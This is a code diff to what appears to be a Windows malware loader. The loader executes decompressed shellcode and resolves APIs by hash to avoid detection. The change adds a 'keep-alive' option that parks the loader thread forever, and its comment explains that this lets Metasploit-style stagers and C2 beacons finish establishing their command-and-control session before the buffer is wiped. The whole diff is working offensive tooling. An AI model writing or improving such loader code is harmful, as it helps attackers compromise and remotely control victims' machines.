@@ -312,7 +312,30 @@ extern "C" int EntryPoint() {
         void (*pShellcode)(void) = (void (*)(void))pDecompressedPE;
         pShellcode();
 
-        /* Reached only if shellcode returns (unusual for C2 beacons) */
+        /* KEEP_ALIVE on shellcode path: many MSF stagers (BlockApi-style)
+         * return to the caller immediately after CreateThread'ing the C2
+         * worker.  If we wipe pDecompressedPE and ExitThread right after
+         * the call, two things break:
+         *   (a) the freshly-spawned worker may still be in startup and
+         *       dereferencing code/data inside our buffer (BlockApi keeps
+         *       trampolines/import tables there) — wiping it crashes the
+         *       worker before it ever touches the network;
+         *   (b) if the stager runs *inline* (no separate thread) and is
+         *       still mid-handshake on its return path, ExitThread(0) on
+         *       the only thread terminates the whole process before any
+         *       packet leaves.
+         * Holding the loader thread parked here lets the worker establish
+         * the C2 session unobstructed; the buffer stays mapped for the
+         * lifetime of the process, which is what stageless beacons assume. */
+        if (opsecFlags & OPSEC_FLAG_KEEP_ALIVE) {
+            typedef VOID (WINAPI *pfnSleep_t)(DWORD);
+            pfnSleep_t pSleep = (pfnSleep_t)GetProcAddressH(hKernel32, g_Hash_Sleep);
+            if (pSleep) {
+                for (;;) pSleep(0xFFFFFFFF);  /* INFINITE — never returns */
+            }
+        }
+
+        /* Reached only if shellcode returns AND KEEP_ALIVE is not set */
         custom_memset(pDecompressedPE, 0, origDecompSize);
         pVirtualFree(pDecompressedPE, 0, MEM_RELEASE);
     } else {
